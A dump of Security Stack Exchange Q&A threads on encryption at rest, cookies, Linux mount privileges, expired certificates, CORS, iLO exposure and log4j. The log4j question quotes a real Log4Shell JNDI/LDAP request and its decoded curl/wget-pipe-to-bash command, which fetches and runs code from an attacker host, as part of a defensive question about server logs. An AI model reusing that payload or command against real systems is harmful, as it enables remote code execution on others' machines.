"258780","258780","Is at-rest encryption worth it if the key has to be kept accessible for decryption?","<p>From the way I understand it, at-rest encryption is used to protect data when it's being stored at a datacenter so that if someone manages to get data they shouldn't have, they don't have anything useful. But regardless of what type of encryption is being used, the key (or some other method) also has to be stored somewhere - readily accessible for decryption. So, wouldn't it be simple for someone to just undo the encryption? Given they already gained access.</p>
<p>Am I just not getting how it works or is there some other concept I'm not taking into consideration?</p>
","29","8","258863","<p>There's more to disk encryption than just this, but I'll stick close to your question:</p>
<p>&quot;readily accessible&quot; does not necessarily mean the same thing for an authorized user and an attacker. For example, imagine the password is written on a post-it right next to the monitor. That's &quot;readily accessible&quot;, right? Well, no it's not if we're talking about a remote attacker hacking in over the network. He has no way of looking at that post-it note.</p>
<p>So the answer depends a lot on your threat model and how exactly the keys are stored.</p>
","1"
"258780","258780","Is at-rest encryption worth it if the key has to be kept accessible for decryption?","<p>From the way I understand it, at-rest encryption is used to protect data when it's being stored at a datacenter so that if someone manages to get data they shouldn't have, they don't have anything useful. But regardless of what type of encryption is being used, the key (or some other method) also has to be stored somewhere - readily accessible for decryption. So, wouldn't it be simple for someone to just undo the encryption? Given they already gained access.</p>
<p>Am I just not getting how it works or is there some other concept I'm not taking into consideration?</p>
","29","8","258869","<h2>Auditing and rate limiting</h2>
<p>In addition to all the concerns mentioned in other answers, two aspects especially relevant for data at rest encryption for sensitive corporate data is auditing and rate limiting.</p>
<p>While a key has to be usable, it does not have to be accessible, you can keep it in a separate system which allows explicit control about how and when the key is used - the main key is not ever leaving the separate secure system, it just gets used by it to decrypt something if the decryption fits certain criteria and deny decryption in certain cases.</p>
<p>Let's assume the attack scenario where attacker has full control of a system which has have sensitive data encrypted at rest, which requires a key to access - but the key itself is stored in a separate secure system. If the system could use the data in normal operations, then it generally has ability to use the keys required for that, and so the attacker can also gain that ability. However, the key system (a HSM might get used, and often you'd have sub-keys - I've seen systems which store a separate random key for each sensitive DB row, all encrypted by a main key kept on a HSM) can be configured to verify and log what data decryption gets requested, which can then raise alarms in monitoring if the operations are unusually frequent or simply unusual - in fact, for some sensitive data (e.g. some signing certificates or backup credentials for some machines) <em>every</em> access can flag a monitoring alert, and in this way you can ensure that access of this at-rest encrypted data is impossible without raising such an alert.</p>
<p>Also, if the normal usage pattern requires rare access to individual rows of sensitive data, where only a small fraction of all sensitive records are accessed each day, then simple rate limiting can be configured to make it impossible for an attacker to decrypt the whole dataset before they get detected, limiting the impact of a database breach.</p>
","0"
"258780","258780","Is at-rest encryption worth it if the key has to be kept accessible for decryption?","<p>From the way I understand it, at-rest encryption is used to protect data when it's being stored at a datacenter so that if someone manages to get data they shouldn't have, they don't have anything useful. But regardless of what type of encryption is being used, the key (or some other method) also has to be stored somewhere - readily accessible for decryption. So, wouldn't it be simple for someone to just undo the encryption? Given they already gained access.</p>
<p>Am I just not getting how it works or is there some other concept I'm not taking into consideration?</p>
","29","8","258880","<p>The thing to remember is that not all compromises are equal.</p>
<p>If a system is totally compromised, then the attacker has the same level of access as the system itself, and can readily decrypt the data.</p>
<p>But not all compromises are total. One illustrative example is the 2013 Adobe hack. A large number of encrypted passwords were exfiltrated, but encryption keys were not. Whilst it is clear that there were some significant failings in Adobe's security, encryption keys appear to have been protected against this attack.</p>
<p>Which is a long winded way of saying the usual: that it depends on your threat model, and that it can be a valid defence in depth strategy, where the usual caveats about defence in depth apply (many weak defences are not a substitute for a strong defence, and you need to consider the additional surface area your additional defences add).</p>
","0"
"258749","258749","What's the point of blocking third party cookies in incognito?","<p>When using incognito, any data will be cleared when the session is closed.</p>
<p>Then why do browsers have the option to disable them?</p>
","1","3","258750","<p>There is a significant difference between accepting a cookie for the current browser session and removing it after the session, or not accepting a cookie in the first place. The first makes it possible to track the user over the different sites used in the same browser session, the second prevents cookie based tracking.</p>
","1"
"258749","258749","What's the point of blocking third party cookies in incognito?","<p>When using incognito, any data will be cleared when the session is closed.</p>
<p>Then why do browsers have the option to disable them?</p>
","1","3","260477","<p>The only thing <em>incognito</em> mode does is clear information from a browsing session from your computer. That's it.</p>
<p>Tracking is still possible, because companies can correlate information between session based on your IP address, your account if you login to a website, URL tracking parameters in <a href=""https://en.wikipedia.org/wiki/Device_fingerprint"" rel=""nofollow noreferrer"">device fingerprinting</a>, etc.</p>
<p>If you accept third-party cookies even for a short session, companies can still share your information between each other and correlate it between browsing sessions by the means I listen and many that I didn't mention. It's still better to deny something upfront instead of allowing it and clearing or resetting regularly.</p>
","0"
"258749","258749","What's the point of blocking third party cookies in incognito?","<p>When using incognito, any data will be cleared when the session is closed.</p>
<p>Then why do browsers have the option to disable them?</p>
","1","3","260479","<p>Deleting 3rd party tracking cookies on browser exit prevents cross-session tracking. Not accepting them in the first place prevents cross-tab tracking. The former is a weaker protection than the latter.</p>
","1"
"258637","258637","Why do I need the root password when mounting an internal drive in Linux?","<p>What is this restriction for in terms of safety? And when connecting external drives via USB, the root password is not required. I can't understand the logic.</p>
<p>I use the following rule in the fstab to connect the internal drive at runtime:</p>
<pre><code>LABEL=disk /media/user/disk ext4 rw,nosuid,nodev,noexec,discard,relatime,user
</code></pre>
<p>How would such a rule add vulnerability?</p>
","27","5","258641","<p>Mounting filesystems has multiple very high security risks, and should not be taken lightly.</p>
<p>Having said that, there are multiple tools (like udisks and the user option in fstab) that run with elevated privileges and try to mitigate risks while allowing users to mount disks.  Most of the mitigations work by carefully controlling mount options.</p>
<p>Here is a short (and incomplete) list of possible risks:</p>
<ul>
<li>a maliciously malformed filesystem could cause the system to crash or trigger buffer overrun errors in the kernel (mitigation: run filesystem check first and reject or repair malformed filesystems)</li>
<li>a maliciously populated filesystem could include setuid binaries or devices with open permissions that would allow privilege escalation (mitigation: mount with nosuid,nodev and possibly noexec)</li>
<li>mount options can allow mounting of existing partitions while forcing file ownership changes via mount options (mitigation: restrict users from supplying mount options)</li>
<li>mount can replace existing system directories (mitigation: only allow user triggered mounts on special designated directories)</li>
<li>unmounting arbitrary filesystems could cause a denial of service attack (mitigation: only allow user mounted filesystems to be user unmounted)</li>
</ul>
<p>To summarize, mount is a system critical function and its effects can severely impact system integrity and security, so it should only be allowed by non-admin users in extremely restricted conditions.</p>
","66"
"258637","258637","Why do I need the root password when mounting an internal drive in Linux?","<p>What is this restriction for in terms of safety? And when connecting external drives via USB, the root password is not required. I can't understand the logic.</p>
<p>I use the following rule in the fstab to connect the internal drive at runtime:</p>
<pre><code>LABEL=disk /media/user/disk ext4 rw,nosuid,nodev,noexec,discard,relatime,user
</code></pre>
<p>How would such a rule add vulnerability?</p>
","27","5","258646","<p>On most modern Linux distributions, there is a helper called <code>udisks</code> that allows users to mount removable drives, such as USB drives, so that they don't have to have root privileges.  However, this helper doesn't typically run on non-removable disks, so it won't apply to internal drives.</p>
<p>The main reason that mounting a disk requires privileges is because it introduces the kernel to untrusted data, which is risky.  The file system could be malicious or malformed, such as by having self-referential data structures, and this could lead an unprivileged user to cause a DoS or arbitrary code execution.  Various other reasons are possible as well, as outlined by user10489.</p>
<p>More importantly, the same privileges are required for both mounting and unmounting, and generally the reason that udisks only works on removable drives is that allowing the user logged into a machine at the console to unmount an internal disk could cause the system to stop working.  For example, if I had a restricted kiosk or business center computer and could unmount the root file system, I could take the kiosk out of service for everyone else until someone came to reboot it.  This is the reason that unmounting drives typically requires privileges, since Unix systems are designed for multple users.</p>
","7"
"258637","258637","Why do I need the root password when mounting an internal drive in Linux?","<p>What is this restriction for in terms of safety? And when connecting external drives via USB, the root password is not required. I can't understand the logic.</p>
<p>I use the following rule in the fstab to connect the internal drive at runtime:</p>
<pre><code>LABEL=disk /media/user/disk ext4 rw,nosuid,nodev,noexec,discard,relatime,user
</code></pre>
<p>How would such a rule add vulnerability?</p>
","27","5","258660","<p>It's hard to tell why the system asks you for a password, without knowing the command you're running. <code>fstab</code> certanly can't ask you for a password, as it is not an executable file.</p>
<p>As you have <code>user</code> specified for <code>/media/user/disk</code>, running <code>mount /media/user/disk</code> as a regular should not ask for a password. In fact, <code>mount</code> never asks for a password at all, it either succeeds or fails. You're probably running <code>sudo mount /media/user/disk</code>, and <code>sudo</code> asks you for a password anyway, because it has no way of knowing the command you're about to run doesn't need to be executed as <code>root</code></p>
<p>Also note that <code>noexec</code>, <code>nosuid</code>, and <code>nodev</code> parameters are implied when <code>user</code> is specified, so they have no effect.</p>
","4"
"258637","258637","Why do I need the root password when mounting an internal drive in Linux?","<p>What is this restriction for in terms of safety? And when connecting external drives via USB, the root password is not required. I can't understand the logic.</p>
<p>I use the following rule in the fstab to connect the internal drive at runtime:</p>
<pre><code>LABEL=disk /media/user/disk ext4 rw,nosuid,nodev,noexec,discard,relatime,user
</code></pre>
<p>How would such a rule add vulnerability?</p>
","27","5","258682","<blockquote>
<p>What is this restriction for in terms of safety? And when connecting external drives via USB, the root password is not required. I can't understand the logic.</p>
</blockquote>
<p>Unix-like systems were designed as multi-user systems and mounting of drives was/is considered an administrative action. A disk may contain data that some users are not allowed to access, it may contain setuid binaries that create a security risk.</p>
<p>As desktop (and even more so laptop) systems that are typically used by a single user at a time became more common, mechanisms were devised to grant the user who is logged into the computer locally some permissions that would normally be reserved to the system administrator. There have been several generations of such systems over the years, as far as I can tell Debian currently use policykit for this purpose.</p>
<p>Most Linux distributions with desktops default to granting users who are logged in locally permission to mount &quot;removable&quot; media. The logic is presumably that removable disks are under the control of the person sitting at the computer and they wouldn't be very useful if every time someone wanted to insert or eject a disk they had to call a sysadmin over. The security vulnerabilities of mounting are mitigated to some extent by restricting the mount location and mount options.</p>
<p>When USB drives came along, they got grouped with removable media from the perspective of the default policy, presumably because that is how in-practice most users use them.</p>
<p>If you are running a high-security shop you will probably want to review the default policies. Default policies in an OS distribution will always be a compromise between security and usability. Mounting a potentially malicious drive even with restricted mount options does bring some risks.</p>
<p>Internal drives on the other hand are still considered the domain of the system administrator and may contain stuff the user currently sitting at the computer is not supposed to access.</p>
","4"
"258637","258637","Why do I need the root password when mounting an internal drive in Linux?","<p>What is this restriction for in terms of safety? And when connecting external drives via USB, the root password is not required. I can't understand the logic.</p>
<p>I use the following rule in the fstab to connect the internal drive at runtime:</p>
<pre><code>LABEL=disk /media/user/disk ext4 rw,nosuid,nodev,noexec,discard,relatime,user
</code></pre>
<p>How would such a rule add vulnerability?</p>
","27","5","258715","<p>Originally, only root could do any mounting.</p>
<p>One reason for this is that arbitrary mounting allows you to mount something over /etc which contains a passwd (and shadow for systems which have it) with contents you control, so you can then log in as any user including root. This is why when user mounts were added they were restricted to specific, safe locations, either by specifying fixed posibilities in /etc/fstab or via tools which only mount in places reserved for them (e.g. pmount). In addition to the obvious problem with replacing /etc, in principle any directory might be security critical depending on what software is being used, so it's not sufficient to block access to a fixed list of dangerous places.</p>
<p>Another way to get root access if you can mount is to mount a filesystem which has a set-uid executable in it. This is why user mounts must always disable setuid for anything they mount. When a volume is mentioned in fstab setuid can be left enabled because the volume has been specifically permitted by the administrator so should be as safe as any other part of the filesystem.</p>
<p>And thirdly, if there is a volume which is normally mounted at a specific place (e.g. /home/alice/secretproject/bigdata) then it may contain data which is normally protected by the permission on a higher directory (in this case, presumably, /home/alice/secretproject). If you could mount it elsewhere, then you could gain access you shouldn't have (this could be mitigated by alice setting the permissions for all files in the root of the volume, but that is weak as it also requires remembering to do it when new files are added). When user mounts are permitted, this weakness is avoided in two different ways. For internal volumes, you can only mount them via fstab, so the administrator has deliberately made them available at fixed places. For external drives, the fact that you have physical posession of the device means you could put it in any machine you control, so by letting you mount it you are not being given any access you don't already have. This is why the default does not allow the same for internal drives. You might be accessing the system remotely with the volume inside the computer securely locked away in a room you don't have access to, so allowing you to mount the volume gives you access you wouldn't otherwise have.</p>
<p>I note that other answers mention malformed filesystem. This is clearly nonsense as external USB drives could just as easily be malformed and since they are under the control of the person inserting them could be used as an attack if malformed filesystems cause a problem. In contrast, an internal device could have been vetted by the administrator so potential malformation is not a reason to prohibit users mounting it.</p>
","2"
"258393","258393","Mistyped ""google"" and came to a suspicious page with a browser hijacker","<p>I misspelt google as &quot;googe&quot; (very dumb, yes). It took me to a page that asked me to enter my birthdate. The URL was something along the lines of luj dott proasdf dott com</p>
<p>After going to malware index, it looks like it redirected to the same page as the infamous goggle site. It is labelled as a browser hijacker. I didn't notice any weirdness in my laptop and did a scan with malwarebytes. Nothing came up.</p>
<p>Should I be worried?</p>
","1","3","258394","<p><em><strong>Assuming that you have an up-to-date operating system and browser:</strong></em></p>
<p>If you know that there was a hijacker on the page, it might be a good idea to reinstall the browser. Any plug-ins/extensions you have installed could be compromised.</p>
<p>Unless you have a reason to suspect something greater, I would not say that your whole machine is compromised.</p>
","1"
"258393","258393","Mistyped ""google"" and came to a suspicious page with a browser hijacker","<p>I misspelt google as &quot;googe&quot; (very dumb, yes). It took me to a page that asked me to enter my birthdate. The URL was something along the lines of luj dott proasdf dott com</p>
<p>After going to malware index, it looks like it redirected to the same page as the infamous goggle site. It is labelled as a browser hijacker. I didn't notice any weirdness in my laptop and did a scan with malwarebytes. Nothing came up.</p>
<p>Should I be worried?</p>
","1","3","258395","<p>The type of attack that you are describing is called a 'drive-by attack', where your device is attacked simply by surfing to a malicious website.  If you are using a modern web browser, and your device and your browser are up to date with all updates, then it's unlikely that such an attack (if there even was one) would have been successful.  See <a href=""https://security.stackexchange.com/questions/172582/do-drive-by-attacks-exist-in-modern-browsers"">Do drive-by attacks exist in modern browsers?</a> for some interesting reading on this subject.</p>
","2"
"258393","258393","Mistyped ""google"" and came to a suspicious page with a browser hijacker","<p>I misspelt google as &quot;googe&quot; (very dumb, yes). It took me to a page that asked me to enter my birthdate. The URL was something along the lines of luj dott proasdf dott com</p>
<p>After going to malware index, it looks like it redirected to the same page as the infamous goggle site. It is labelled as a browser hijacker. I didn't notice any weirdness in my laptop and did a scan with malwarebytes. Nothing came up.</p>
<p>Should I be worried?</p>
","1","3","259063","<p>Assuming your web browser is up to date, and you didn't enter anything into the survey box, or click on anything in there you should be okay.</p>
<p>Check your downloads to see if anything was automatically downloaded, and if so delete it.</p>
<p>I ran a scan on virus total, and it showed it was malicious, but if your antivirus doesn't pick anything up, then it should be pretty safe. Malwarebytes is generally pretty good.</p>
<p>If you're on mac then you should be even safer, and if you're on windows make sure you're only using the free version of malwarebyes, because otherwise windows defender deactivates, and run a scan with windows defender in case malware bytes was wrong.</p>
","0"
"258377","258377","Should I visit a website of a popular company if the browser warns of a potential security risk?","<p>I have faced this situation several times. Some websites are presented as a potential security risk. Should I continue to browse such a webpage?</p>
<p>I am attaching one example, just an example. Actually I need a general answer.</p>
<p>I was trying to find out the specs of some equipment made by Gilardoni, an Italian company. I followed the link from Google, but the browser somehow thinks the website is a potential security risk. I investigated further and found that the webpage is presenting a security certificate that has expired just yesterday. The company is famous in this field, but how do I know that I am not being a victim of an MITM attack or there isn't something phishy going on?</p>
<p><a href=""https://i.stack.imgur.com/j5Xsm.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/j5Xsm.png"" alt=""enter image description here"" /></a></p>
<p><a href=""https://i.stack.imgur.com/931mc.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/931mc.png"" alt=""enter image description here"" /></a></p>
","19","3","258379","<p>As a practical matter, in this <em>particular</em> case you're probably fine. Certificates have expiration dates for a number of reasons, one of which is that there's always some risk of compromise (leaking the private key, somebody factoring the public key, etc.), and regularly rotating them mitigates this. Sites that use manually rotated certificates typically use lifetimes of at least a few months to a year (historically often a few years, but most browsers don't allow that anymore). Let's Encrypt is designed for automatic certificate rotation, so the validity is set relatively short because to the server, rotating every month, or even every day, shouldn't be very hard. <em>In this case</em>, it looks like the server has failed to rotate its cert on schedule, which is a sign of some kind of problem (likely just some sysadmin screwed something up, or some automated maintenance tool got broken), but it's probably not going to put your data at risk.</p>
<p><em>In general</em>, though, be wary. If the certificate is invalid for any reason other than expiration, that's a very bad sign. If it expired long ago, that's a bad sign. If it's a really high-sensitivity site (e.g. banking, legal, or government site where you're submitting very valuable data), that's a bad sign. If you aren't confident whether or not you can tell the difference between &quot;certificate is valid except it just expired&quot; and &quot;certificate is invalid because it's from a MitM, but also just expired to make me think it was valid yesterday&quot; then follow the recommendation of your browser and don't trust the site.</p>
<p>Of course &quot;don't trust the site&quot; means different things depending on what you're doing with it. Don't enter credentials, or personally identifiable information, or other secrets. (That includes, don't visit the site if you logged in before and the site remembers your identity! That's done by the browser storing and automatically transmitting a secret.) Don't download software. Don't allow any requests for access to stuff like your microphone, camera, or location. But if you're just looking up an owner's manual, or checking a restaurant menu, or checking some public record, it's probably OK. In any case, though, if you aren't sure, it's pretty much always safest to just... not. It might take a few days considering the holidays, but if there's nothing actually wrong, it'll be fixed soon.</p>
","35"
"258377","258377","Should I visit a website of a popular company if the browser warns of a potential security risk?","<p>I have faced this situation several times. Some websites are presented as a potential security risk. Should I continue to browse such a webpage?</p>
<p>I am attaching one example, just an example. Actually I need a general answer.</p>
<p>I was trying to find out the specs of some equipment made by Gilardoni, an Italian company. I followed the link from Google, but the browser somehow thinks the website is a potential security risk. I investigated further and found that the webpage is presenting a security certificate that has expired just yesterday. The company is famous in this field, but how do I know that I am not being a victim of an MITM attack or there isn't something phishy going on?</p>
<p><a href=""https://i.stack.imgur.com/j5Xsm.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/j5Xsm.png"" alt=""enter image description here"" /></a></p>
<p><a href=""https://i.stack.imgur.com/931mc.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/931mc.png"" alt=""enter image description here"" /></a></p>
","19","3","258412","<p>It probably is a glitch in the server - Lets Encrypt/certbot also sets up a cron job to make sure certificates are regularly auto-renewed in time.</p>
<p>On my Lets Encrypt setup, the certificate is shared between e.g. 'host.entity.com' and 'www.entity.com', and 'something.entity.com'.</p>
<p>All that is required in my server is that a Lets Encrypt server can make a successful connection to each of the URLs listed on the certificate, then the certificate will be issued.</p>
<p>So if for some reason one of my &quot;servers&quot; (all same IP address, different DNS records)  go down , I assume that means the certificate stops renewing.</p>
","0"
"258377","258377","Should I visit a website of a popular company if the browser warns of a potential security risk?","<p>I have faced this situation several times. Some websites are presented as a potential security risk. Should I continue to browse such a webpage?</p>
<p>I am attaching one example, just an example. Actually I need a general answer.</p>
<p>I was trying to find out the specs of some equipment made by Gilardoni, an Italian company. I followed the link from Google, but the browser somehow thinks the website is a potential security risk. I investigated further and found that the webpage is presenting a security certificate that has expired just yesterday. The company is famous in this field, but how do I know that I am not being a victim of an MITM attack or there isn't something phishy going on?</p>
<p><a href=""https://i.stack.imgur.com/j5Xsm.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/j5Xsm.png"" alt=""enter image description here"" /></a></p>
<p><a href=""https://i.stack.imgur.com/931mc.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/931mc.png"" alt=""enter image description here"" /></a></p>
","19","3","258423","<p>How do you determine there isn’t a man in the middle attack going on?  You don’t.  It’s an expired certificate, so odds are you aren’t, on the other hand odds are almost always that you aren’t in the middle of a man in the middle attack even without SSL and a certificate.</p>
<p>If you want to trust odds, you never have to worry about an invalid certificate, regardless of why it is invalid.</p>
<p>Of course, they say the odds always catch up with you eventually…</p>
","0"
"258362","258362","Do we need to check for cross-origin on server side?","<p>Modern browsers don't allow cross-origin requests - those must be explicitly allowed by CORS headers. But looking at Java back ends like Tomcat/Spring MVC I see that it's possible to <a href=""https://github.com/quickhack/tomcat/blob/6782a9ffa2f34ba0183361f2b40934309a357034/src/main/java/org/apache/catalina/filters/CorsFilter.java#L254"" rel=""noreferrer"">reject requests</a> from other origins on server side.</p>
<p>Since browsers handle this on their end - do we really need to care about it on server side? Well, there are Simple Requests which we do need to take care of, but those can easily be disabled by requiring some custom HTTP header. What about the rest of the cases?</p>
","5","3","258363","<p>There is no reason to handle them on the backend as they can easily be spoofed.</p>
<p>The concept of CORS is to ensure one resource (say <code>hacker.com</code>) cannot access another resource (say <code>facebook.com</code>) in the browser unless the accessed resource gives permissions. This is only relevant in the context of a browser as the resources being accessed are cookies, headers and more and thus enforced by the browser to separate these two resources from each other.</p>
<p>By trying to enforce it on the backend, you aren't providing any additional security measures as the browser is the one holding the &quot;sensitive&quot; data. Additionally, the origin header can easily be spoofed.
I assume the settings you see in Tomcat and Spring are just for setting the CORS settings to let the browser know what origin's to allow and what to deny.</p>
","5"
"258362","258362","Do we need to check for cross-origin on server side?","<p>Modern browsers don't allow cross-origin requests - those must be explicitly allowed by CORS headers. But looking at Java back ends like Tomcat/Spring MVC I see that it's possible to <a href=""https://github.com/quickhack/tomcat/blob/6782a9ffa2f34ba0183361f2b40934309a357034/src/main/java/org/apache/catalina/filters/CorsFilter.java#L254"" rel=""noreferrer"">reject requests</a> from other origins on server side.</p>
<p>Since browsers handle this on their end - do we really need to care about it on server side? Well, there are Simple Requests which we do need to take care of, but those can easily be disabled by requiring some custom HTTP header. What about the rest of the cases?</p>
","5","3","258370","<p>The cross-origin nature of a request can be of interest on the server-side beyond allowing/disallowing the request for CORS purposes. In particular, you may want to implement a <em>resource-isolation policy</em>:</p>
<blockquote>
<p>It is common for resources exposed by a given web application to only be loaded by the application itself, and not by other websites. In such cases, deploying a Resource Isolation Policy based on Fetch Metadata request headers takes little effort, and at the same time protects the application from cross-site attacks.</p>
</blockquote>
<p>(source: <a href=""https://web.dev/fetch-metadata/"" rel=""nofollow noreferrer"">Protect your resources from web attacks with Fetch Metadata</a>)</p>
","1"
"258362","258362","Do we need to check for cross-origin on server side?","<p>Modern browsers don't allow cross-origin requests - those must be explicitly allowed by CORS headers. But looking at Java back ends like Tomcat/Spring MVC I see that it's possible to <a href=""https://github.com/quickhack/tomcat/blob/6782a9ffa2f34ba0183361f2b40934309a357034/src/main/java/org/apache/catalina/filters/CorsFilter.java#L254"" rel=""noreferrer"">reject requests</a> from other origins on server side.</p>
<p>Since browsers handle this on their end - do we really need to care about it on server side? Well, there are Simple Requests which we do need to take care of, but those can easily be disabled by requiring some custom HTTP header. What about the rest of the cases?</p>
","5","3","265002","<p>I think you're trying to ask why servers have origin checks when it comes to protecting resources and sensitive actions. CORS will prevent the reading of sensitive data by malicious sites, but it will not prevent the posting of data to a server. An important step in added security to mitigate this is the now default same-site policy on cookies across all major browsers. However, security needs redundancies (what if same-site policy is set to lax accident?) and additional server checks are important.</p>
<p>For example, your bank would like to protect your account. If a malicious site tries to call your bank site requesting a withdrawal, the bank server should first check if the Origin header of the request matches the bank's domain (or aby of its whitelisted sites). If not, it should reject the request. Hidden form tokens provide another layer of protection against cross-origin writes. A rest client or curl call can spoof the origin as some comments note, but that doesn't matter because an attacker still needs access to the cookie key which resides in your browser. Back to the browser, CORS policy alone won't secure the server from processing a request as you can see.</p>
","0"
"258315","258315","Possible MITM attack on remote server administration","<p>I have an HP Proliant server. I have been using it for several years. Sometimes I used its iLO web interface via WAN (I have forwared required ports) completely ignoring all warnings from my browser about the server certificate being invalid. Recently I have learned many information about SSL/TLS and MITM attacks. Now I am VERY concerned about security issues. What if a bad guy in the middle learned my iLO credentials? What if he has already installed an undetectable malware? What if he modified iLO firmware so his activity is not displayed in iLO event log? What if he hacked the firmware so erasing and resetting everything won't help?</p>
<p>What should I do? Should I fear anything I have listed here? Should I change iLO password? Should I reset hard drives (currently there is no any valuable information stored on the server, so I can do it if it needed)? Should I do a Secure Erase? Should I reset iLO to factory defaults?</p>
","0","3","258319","<p>You should definitely check the validity of the server certificate. If it is not the cert you were expecting then yes, an attacker could potentially have compromised everything on that server and used it to pivot further attacks.</p>
<p>The recommendation here for a compromised server is always the same: wipe it and rebuild.<sup>*</sup></p>
<p>You may not need to do that, however that would be your call based on what you have on it, what data you value, your risk model etc.</p>
<hr />
<p><sup>*</sup> if you have the capability for forensic investigation and you think it will be worthwhile trying to understand how an attack was carried out, then take an image of the machine before wiping, however it is costly, and may not tell you anything</p>
","1"
"258315","258315","Possible MITM attack on remote server administration","<p>I have an HP Proliant server. I have been using it for several years. Sometimes I used its iLO web interface via WAN (I have forwared required ports) completely ignoring all warnings from my browser about the server certificate being invalid. Recently I have learned many information about SSL/TLS and MITM attacks. Now I am VERY concerned about security issues. What if a bad guy in the middle learned my iLO credentials? What if he has already installed an undetectable malware? What if he modified iLO firmware so his activity is not displayed in iLO event log? What if he hacked the firmware so erasing and resetting everything won't help?</p>
<p>What should I do? Should I fear anything I have listed here? Should I change iLO password? Should I reset hard drives (currently there is no any valuable information stored on the server, so I can do it if it needed)? Should I do a Secure Erase? Should I reset iLO to factory defaults?</p>
","0","3","258320","<blockquote>
<p>What if a bad guy in the middle learned my iLO credentials?</p>
</blockquote>
<p>then you are screwed. You should regularly change the password on iLO.</p>
<blockquote>
<p>What if he has already installed an undetectable malware?</p>
</blockquote>
<p>then you are screwed. However I'm not sure if you can install a malware on iLO.</p>
<blockquote>
<p>What should I do?</p>
</blockquote>
<ol>
<li>change the password on iLO.</li>
<li>use HP guide to install the certificate you trust (either from commercial provider, or internal enterprise CA). Do not use self-signed.</li>
<li>optionally, set up firewall to allow access to iLO from known networks (if there are such). I would restrict direct access to iLO from internet. Instead, you should do secure VPN connection (from home, for example) to corporate network and then access iLO from internal network.</li>
<li>make sure you do not ignore certificate errors automatically.</li>
</ol>
<blockquote>
<p>Should I reset hard drives (currently there is no any valuable information stored on the server, so I can do it if it needed)?</p>
</blockquote>
<p>I wouldn't say it is necessary. AFAIK, iLO does not provide writable access to host storage.</p>
<blockquote>
<p>Should I reset iLO to factory defaults?</p>
</blockquote>
<p>if there is an evidence that iLO is compromised, then yes, you should do factory reset.</p>
","0"
"258315","258315","Possible MITM attack on remote server administration","<p>I have an HP Proliant server. I have been using it for several years. Sometimes I used its iLO web interface via WAN (I have forwared required ports) completely ignoring all warnings from my browser about the server certificate being invalid. Recently I have learned many information about SSL/TLS and MITM attacks. Now I am VERY concerned about security issues. What if a bad guy in the middle learned my iLO credentials? What if he has already installed an undetectable malware? What if he modified iLO firmware so his activity is not displayed in iLO event log? What if he hacked the firmware so erasing and resetting everything won't help?</p>
<p>What should I do? Should I fear anything I have listed here? Should I change iLO password? Should I reset hard drives (currently there is no any valuable information stored on the server, so I can do it if it needed)? Should I do a Secure Erase? Should I reset iLO to factory defaults?</p>
","0","3","258323","<blockquote>
<p>Sometimes I used its iLO web interface via WAN (I have forwared
required ports)</p>
</blockquote>
<p>Then it means your service is exposed to the whole Internet, unless you have some firewall rules that restrict access to a few whitelisted IP addresses. I would instead recommend that you use a VPN to connect to your corporate network. Do not expose sensitive services to the public Internet when there are alternatives.</p>
<blockquote>
<p>What if a bad guy in the middle learned my iLO credentials?</p>
</blockquote>
<p>Then you have a bigger problem than just a potentially compromised ILO. If your Internet connection has been compromised and you have a MITM on your network, then the potential damage goes well beyond the ILO and you need to consider the bigger picture.</p>
<blockquote>
<p>What if he hacked the firmware so erasing and resetting everything
won't help?</p>
</blockquote>
<p>I don't know if that is even possible or technically doable. If in doubt you can reset reset the firmware and configuration, and change passwords, and install a proper certificate. Check the logs too. But there is no reason to panic unless there are indicators of compromise.</p>
","0"
"258308","258308","successfull log4j exploitation, or just normal traffic?","<p>First, thanks in advance and sorry if I'm asking some really silly thing, this is not my expertise :)</p>
<p>I have a webserver just for testing my things. Last week I checked if it was vulnerable to log4j CVE and it seemed only Jenkins was using some trace of log4j but inside slf4j (<a href=""https://www.slf4j.org/log4shell.html"" rel=""nofollow noreferrer"">https://www.slf4j.org/log4shell.html</a>) which doesn't seem to be vulnerable on that version.</p>
<pre><code>/var/lib/jenkins/plugins/ssh-slaves/WEB-INF/lib/log4j-over-slf4j-1.7.26.jar
</code></pre>
<p>I updated everything I could just to be on the safe side. I left it there but today I was messing with the apache logs and I started to see entries like this:</p>
<pre><code>195.54.160.149 - - [26/Dec/2021:10:43:35 +0100] &quot;GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/longbase64HERE} HTTP/1.1&quot; 200 90
</code></pre>
<p>Note: the edited base64 once decoded was something like:</p>
<pre><code>(curl -s 195.54.160.149:5874/MYIP:443||wget -q -O- 195.54.160.149:5874/MYIP:443)|bash
</code></pre>
<p>I ran several scripts to detect if there were more traces of log4j on my server, but everything seemed clear.</p>
<p>Should I be concerned that the server is responding with a 200 code?
Thanks</p>
","0","3","258313","<blockquote>
<p>Should I be concerned that the server is responding with a 200 code? Thanks</p>
</blockquote>
<p>Simply looking at the status code does not help here. A successful exploit might lead to a status code 200, 404, ... whatever. An unsuccessful exploit attempt too. So based on this nothing can be said if you need to be concerned or not.</p>
","0"
"258308","258308","successfull log4j exploitation, or just normal traffic?","<p>First, thanks in advance and sorry if I'm asking some really silly thing, this is not my expertise :)</p>
<p>I have a webserver just for testing my things. Last week I checked if it was vulnerable to log4j CVE and it seemed only Jenkins was using some trace of log4j but inside slf4j (<a href=""https://www.slf4j.org/log4shell.html"" rel=""nofollow noreferrer"">https://www.slf4j.org/log4shell.html</a>) which doesn't seem to be vulnerable on that version.</p>
<pre><code>/var/lib/jenkins/plugins/ssh-slaves/WEB-INF/lib/log4j-over-slf4j-1.7.26.jar
</code></pre>
<p>I updated everything I could just to be on the safe side. I left it there but today I was messing with the apache logs and I started to see entries like this:</p>
<pre><code>195.54.160.149 - - [26/Dec/2021:10:43:35 +0100] &quot;GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/longbase64HERE} HTTP/1.1&quot; 200 90
</code></pre>
<p>Note: the edited base64 once decoded was something like:</p>
<pre><code>(curl -s 195.54.160.149:5874/MYIP:443||wget -q -O- 195.54.160.149:5874/MYIP:443)|bash
</code></pre>
<p>I ran several scripts to detect if there were more traces of log4j on my server, but everything seemed clear.</p>
<p>Should I be concerned that the server is responding with a 200 code?
Thanks</p>
